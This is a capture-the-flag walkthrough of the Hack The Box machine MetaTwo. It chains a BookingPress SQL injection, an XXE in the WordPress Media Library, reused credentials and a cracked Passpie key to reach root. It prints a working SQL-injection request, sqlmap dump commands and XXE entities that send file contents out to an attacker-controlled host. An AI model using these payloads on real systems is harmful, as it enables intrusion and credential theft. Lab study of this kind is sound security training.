# Hack The Box - MetaTwo

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-MetaTwo-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Operating System](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Web](https://img.shields.io/badge/Focus-Web-red?style=for-the-badge)

> **MetaTwo** is an Easy-difficulty Linux machine that features a WordPress installation vulnerable to an unauthenticated SQL injection in the BookingPress plugin. The attack chain involves SQL injection, password cracking, an XXE vulnerability in the WordPress Media Library, FTP enumeration, credential reuse, SSH access, and exploitation of the `passpie` utility to obtain root privileges.

---

## Machine Information

| **Machine** | **MetaTwo** |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | `10.129.228.95` |
| **Primary Focus** | Web Exploitation |
| **Vulnerabilities** | CVE-2022-0739, CVE-2021-29447 |
| **Initial Access** | WordPress SQL Injection → XXE → FTP → SSH |
| **Privilege Escalation** | Passpie / GPG Key Cracking |

---

# 1. Enumeration

## 1.1 Nmap

I started by performing a full TCP port scan to identify all exposed services.

    nmap -sS -sV -sC -p- --min-rate 5000 -Pn 10.129.228.95 -oN nmap

The scan revealed three open ports:

    21/tcp   FTP
    22/tcp   SSH
    80/tcp   HTTP

The results showed:

    21/tcp   open  ftp
    22/tcp   open  ssh
    80/tcp   open  http    nginx

---

<img width="953" height="420" alt="image" src="https://github.com/user-attachments/assets/4f3f10b2-7ddb-4915-b133-43d383be021f" />


# 2. HTTP Enumeration

Browsing to port 80 redirected to:

    http://metapress.htb

I added the hostname to `/etc/hosts`:

    echo "10.129.228.95 metapress.htb" | sudo tee -a /etc/hosts

The website was running WordPress.

Using Wappalyzer, I identified the following technologies:

    WordPress 5.6.2
    PHP 8.0.24

The website also contained an Events page:

    http://metapress.htb/events/

The Events page contained an appointment scheduling system.

By inspecting the source code, I identified the following WordPress plugin:

    bookingpress-appointment-booking

The installed version was:

    1.0.10

This version is vulnerable to an unauthenticated SQL Injection identified as:

    CVE-2022-0739

---

# 3. Unauthenticated SQL Injection

According to the vulnerability details, the BookingPress plugin fails to properly sanitize user-controlled POST data before using it in a dynamically constructed SQL query.

The vulnerable AJAX action is:

    bookingpress_front_get_category_services

The vulnerable parameter is:

    total_service

The `_wpnonce` value required by the exploit could be obtained from the source code of the Events page.

<img width="959" height="431" alt="image" src="https://github.com/user-attachments/assets/e0873cf2-7c35-4fa2-81cc-fbb6245859d0" />


I first verified the SQL injection manually using cURL:

    curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=9aa0a5d2b2>&category_id=123&total_service=111) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

The response confirmed that the parameter was injectable.

<img width="955" height="366" alt="image" src="https://github.com/user-attachments/assets/6741aeb7-ed06-4063-b1ca-b28d712d33a0" />


---

# 4. SQLMap

After confirming the vulnerability manually, I used SQLMap to automate the exploitation.

The first step was enumerating the available databases.

    sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data "action=bookingpress_front_get_category_services&_wpnonce=9aa0a5d2b2&category_id=123&total_service=111" -p total_service --level=5 --risk=3 --dbs

<img width="954" height="441" alt="image" src="https://github.com/user-attachments/assets/3a0aade5-a89c-4d19-8703-b49721b76583" />


The database enumeration revealed the following databases:

    blog
    information_schema

   <img width="958" height="279" alt="image" src="https://github.com/user-attachments/assets/af71609a-879f-425b-8b75-1e30c7f32445" />
 

I then enumerated the tables inside the `blog` database:

    sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data "action=bookingpress_front_get_category_services&_wpnonce=9aa0a5d2b2&category_id=123&total_service=111" -p total_service --level=5 --risk=3 -D blog --tables
    
The WordPress users table was identified:

    wp_users

<img width="959" height="645" alt="image" src="https://github.com/user-attachments/assets/c140b38e-57c5-4837-8b8a-60560466749d" />


I dumped the table:

    sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data "action=bookingpress_front_get_category_services&_wpnonce=9aa0a5d2b2&category_id=123&total_service=111" -p total_service --level=5 --risk=3 -D blog -T wp_users --dump

The dump revealed WordPress password hashes, including the hash belonging to the `manager` user.


<img width="955" height="334" alt="image" src="https://github.com/user-attachments/assets/6343dcd3-0694-48b1-b948-a40dc9976d1e" />


---

# 5. Cracking the WordPress Password

I saved the recovered hash into a file:

    nano wp_users.hash

I then used John the Ripper with the `rockyou.txt` wordlist:

    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

The password for the `manager` account was recovered:

    Username: manager
    Password: partylikearockstar

<img width="954" height="222" alt="image" src="https://github.com/user-attachments/assets/6f4783ff-a59d-4ec9-a741-15a6aa380365" />


---

# 6. WordPress Authentication

The WordPress login page was available at:

    http://metapress.htb/wp-login.php

Using the recovered credentials:

    Username: manager
    Password: partylikearockstar

I successfully authenticated to the WordPress administration dashboard.

---

# 7. Authenticated XXE

The installed WordPress version was:

    WordPress 5.6.2

This version is vulnerable to an authenticated XML External Entity injection affecting the Media Library.

The vulnerability is:

    CVE-2021-29447

The vulnerability can be exploited by uploading a specially crafted WAV file containing malicious XML.

The XML payload references an external DTD controlled by the attacker.

This allows the server to retrieve the external DTD and use it to read local files.

---

# 8. Creating the XXE Payload

I created two files:

    payload.wav
    evil.dtd

The WAV file contained an embedded XML payload that referenced the attacker's external DTD.

The external DTD was used to read local files through the PHP `php://filter` wrapper.

Example:

    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.65:8080/?p=%file;'>">

The Base64 encoding was useful because it prevented special characters inside the retrieved files from breaking the XML request.

---

# 9. Starting the HTTP Server

I started a Python HTTP server from the directory containing `evil.dtd`:

    python3 -m http.server 8080

The target machine would connect back to this server to retrieve the malicious DTD.

<img width="954" height="728" alt="image" src="https://github.com/user-attachments/assets/f990b88c-6d73-4bc6-b4c3-d02b45ffcec1" />


---

# 10. Exploiting the XXE

I logged into WordPress as `manager` and navigated to the Media Library.

I uploaded the malicious:

    payload.wav

file.

The vulnerable XML parser processed the embedded XML and requested the external DTD from my HTTP server.

The DTD instructed the target to read:

    /etc/passwd

and send the contents back to my HTTP server as Base64-encoded data.

After decoding the returned data, I obtained the contents of `/etc/passwd`.

<img width="957" height="797" alt="image" src="https://github.com/user-attachments/assets/90316e68-a2c0-4420-9070-f75f481fc695" />


Among the listed users was:

    jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash

This confirmed that a local user named `jnelson` existed on the target.

---

# 11. Reading wp-config.php

The same XXE vulnerability could be used to retrieve the WordPress configuration file.

I modified `evil.dtd` to read:

    ../wp-config.php

<img width="647" height="118" alt="image" src="https://github.com/user-attachments/assets/976c3684-7fbf-42fd-ae16-e3d336d10823" />


using the PHP filter:

    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.65:8080/?p=%file;'>">

After uploading the malicious WAV file again, the contents of `wp-config.php` were returned to my HTTP server.

The configuration file contained FTP credentials:

    FTP_USER: metapress.htb
    FTP_PASS: 9NYS_ii@FyL_p5M2NvJ
    FTP_HOST: ftp.metapress.htb
    FTP_BASE: blog/

<img width="956" height="511" alt="image" src="https://github.com/user-attachments/assets/8cfa352f-de53-4ca3-9215-8e3b03c86eb2" />


These credentials could be used to access the FTP service.

---

# 12. FTP Enumeration

I connected to the FTP service:

    ftp 10.129.228.95

Using the credentials obtained from `wp-config.php`:

    Username: metapress.htb
    Password: 9NYS_ii@FyL_p5M2NvJ

After authenticating, I enumerated the available files:

    ls

An interesting file was discovered:

    send_email.php

I downloaded the file:

    get send_email.php

---

# 13. Credential Disclosure

I inspected the contents of `send_email.php`.

The PHP script contained SMTP configuration information, including credentials for the user `jnelson`:

    Username: jnelson@metapress.htb
    Password: Cb4_JmWM8zUZWMu@Ys

<img width="952" height="739" alt="image" src="https://github.com/user-attachments/assets/f619493f-aae6-4f65-80b8-c4d08e941739" />


Since the `/etc/passwd` file had already confirmed the existence of the local `jnelson` account, I attempted to reuse these credentials for SSH authentication.

---

# 14. SSH Access

I connected to the target using SSH:

    ssh jnelson@10.129.228.95

Using the recovered password:

    Cb4_JmWM8zUZWMu@Ys

The authentication was successful.

I obtained a shell as:

    jnelson

---

# 15. User Flag

The user flag was located in:

    /home/jnelson/user.txt

I retrieved it with:

    cat /home/jnelson/user.txt
    
---

# 16. Privilege Escalation Enumeration

After obtaining SSH access as `jnelson`, I enumerated the user's home directory:

    ls -la

An interesting directory was found:

    .passpie

Passpie is a command-line password manager that uses GnuPG to encrypt stored credentials.

I inspected the directory:

    ls -al ~/.passpie/

A file named `.keys` was discovered:

    ~/.passpie/.keys

I inspected its contents:

    cat ~/.passpie/.keys

<img width="959" height="633" alt="image" src="https://github.com/user-attachments/assets/9ed25ff0-9da0-482a-b6cc-53728e69a7c3" />


The file contained both public and private GPG key blocks.

---

# 17. Extracting the GPG Key

I copied the `.keys` file to my attacking machine using SCP:

    scp jnelson@10.129.228.95:/home/jnelson/.passpie/.keys ./keys

The file contained both public and private keys.

I removed the public key block because only the private key was required for the cracking process.

I then used `gpg2john` to convert the private GPG key into a format compatible with John the Ripper:

    gpg2john keys > keys.hash

---

# 18. Cracking the Passpie Password

I used John the Ripper with the `rockyou.txt` wordlist:

    john --wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg

The GPG passphrase was successfully recovered:

    blink182

<img width="954" height="301" alt="image" src="https://github.com/user-attachments/assets/e4ef467b-15d1-426a-a1dd-ef36d243739b" />


---

# 19. Exporting Passpie Credentials

Passpie can export the stored credentials in plaintext after providing the correct master passphrase.

I used:

    passpie export ~/password.db

I then inspected the resulting database:

    cat ~/password.db

The database contained the credentials for the root user.

The recovered root password was:

    p7qfAZt4_A1xo_0x

<img width="956" height="402" alt="image" src="https://github.com/user-attachments/assets/625c49bc-4804-4c44-993d-3f592ad72b17" />


---

# 20. Root Access

I switched to the root account:

    su root

I entered the recovered password:

    p7qfAZt4_A1xo_0x

The authentication was successful.

I confirmed my privileges:

    whoami

Output:

    root

At this point, I had full administrative access to the machine.

<img width="960" height="140" alt="image" src="https://github.com/user-attachments/assets/c8773e9f-77a5-4baa-aafc-7de0aabe1120" />


---

# 21. Root Flag

The root flag was located at:

    /root/root.txt

I retrieved it with:

    cat /root/root.txt

    ROOT_FLAG_HERE

---

# Attack Path

    Nmap
      │
      ├── FTP : 21
      ├── SSH : 22
      └── HTTP : 80
              │
              ▼
        metapress.htb
              │
              ▼
        WordPress 5.6.2
              │
              ▼
        BookingPress 1.0.10
              │
              ▼
        CVE-2022-0739
        Unauthenticated SQL Injection
              │
              ▼
        WordPress Database
              │
              ▼
        wp_users
              │
              ▼
        Crack manager password
              │
              ▼
        WordPress Admin Access
              │
              ▼
        CVE-2021-29447
        Authenticated XXE
              │
              ├── /etc/passwd
              │
              └── wp-config.php
                      │
                      ▼
                FTP Credentials
                      │
                      ▼
                   FTP Access
                      │
                      ▼
                send_email.php
                      │
                      ▼
                jnelson Credentials
                      │
                      ▼
                   SSH Access
                      │
                      ▼
                   User Flag
                      │
                      ▼
              ~/.passpie/.keys
                      │
                      ▼
                   gpg2john
                      │
                      ▼
               John the Ripper
                      │
                      ▼
                Passpie Password
                    blink182
                      │
                      ▼
                passpie export
                      │
                      ▼
                Root Password
                      │
                      ▼
                    su root
                      │
                      ▼
                   Root Flag

---

# Flags

    User Flag: USER_FLAG_HERE

    Root Flag: ROOT_FLAG_HERE

---

# Key Takeaways

- Full TCP port scanning is essential for identifying all exposed services.
- HTTP enumeration can reveal the technologies and plugins used by a web application.
- WordPress plugins should always be checked for known vulnerabilities.
- CVE-2022-0739 allows unauthenticated SQL injection through the vulnerable BookingPress plugin.
- SQL injection can expose sensitive application data such as WordPress password hashes.
- Weak passwords can allow authentication to privileged application accounts.
- CVE-2021-29447 allows authenticated XXE exploitation through the WordPress Media Library.
- PHP stream wrappers such as `php://filter` can be used to retrieve and encode local files through XXE.
- Configuration files such as `wp-config.php` can contain sensitive credentials.
- Credentials discovered through one service should be tested against other exposed services.
- Files stored on FTP servers may contain additional credentials.
- Password managers should be inspected carefully during privilege escalation.
- Passpie uses GnuPG to encrypt stored credentials.
- GPG private keys can be converted into crackable formats using `gpg2john`.
- Weak GPG/passphrase protection can lead to the recovery of stored credentials.
- Passpie can export stored credentials once the master passphrase has been recovered.
- Reusing recovered credentials can ultimately lead to root access.

---

# Tools Used

- Nmap
- Wappalyzer
- cURL
- SQLMap
- John the Ripper
- Python HTTP Server
- FTP
- SCP
- SSH
- gpg2john
- Passpie

---

# Vulnerabilities

## CVE-2022-0739

Unauthenticated SQL Injection in the BookingPress WordPress plugin version 1.0.10.

## CVE-2021-29447

Authenticated XML External Entity Injection in the WordPress Media Library.

---

# Techniques Used

- Network Enumeration
- Web Enumeration
- WordPress Enumeration
- SQL Injection
- Password Hash Extraction
- Password Cracking
- XML External Entity Injection
- Local File Disclosure
- Credential Extraction
- FTP Enumeration
- SSH Authentication
- GPG Key Extraction
- GPG Password Cracking
- Passpie Credential Extraction
- Privilege Escalation

---

# Conclusion

MetaTwo demonstrates a complete attack chain beginning with web enumeration and an unauthenticated SQL injection in a vulnerable WordPress plugin.

The SQL injection allowed the WordPress database to be accessed and password hashes to be recovered. After cracking the `manager` password, authenticated access to WordPress was obtained.

The vulnerable WordPress version could then be exploited through an authenticated XXE vulnerability in the Media Library to read sensitive local files. Reading `wp-config.php` exposed FTP credentials, which allowed access to the FTP server.

The `send_email.php` file on the FTP server contained credentials for the `jnelson` user, providing SSH access and the user flag.

For privilege escalation, the `.passpie` directory contained a GPG private key. After extracting and cracking the key using `gpg2john` and John the Ripper, the Passpie database could be exported, revealing the root password.

Finally, the recovered password was used with `su` to obtain a root shell and retrieve the root flag.

The final attack chain was:

    Unauthenticated SQL Injection
    → WordPress Credential Cracking
    → WordPress Admin Access
    → Authenticated XXE
    → Local File Read
    → FTP Credentials
    → FTP Access
    → SSH Credentials
    → SSH Access
    → Passpie GPG Key
    → GPG Password Cracking
    → Root Credentials
    → Root Access
